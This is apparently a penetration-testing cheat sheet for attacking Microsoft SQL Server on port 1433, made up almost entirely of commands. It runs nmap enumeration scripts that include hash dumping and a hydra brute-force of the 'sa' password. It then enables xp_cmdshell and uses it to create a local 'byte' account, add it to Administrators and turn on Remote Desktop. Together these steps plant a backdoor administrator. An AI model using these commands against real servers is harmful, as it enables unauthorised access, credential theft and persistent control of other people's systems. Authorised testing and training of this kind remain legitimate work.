# MSSQL - Microsoft SQL Server - 1433

## MSSQL Information

## Automated Enumeration

Nmap has a few scripts that we can use to enumerate MSSQL:

```text
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

Quick brutetroce for pass “SA” password

```text
hydra -l sa -P password.txt -V $ip mssql
```

Connect to MSSQL Server:

```text
sqsh -S server_address -U sa -P password
```

Enable xp\_cmdshell:

```text
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
```

Execute System Command:

```text
xp_cmdshell 'net user byte bytepass /add'
go
xp_cmdshell 'net localgroup Administrators byte /add'
go
xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
go
```



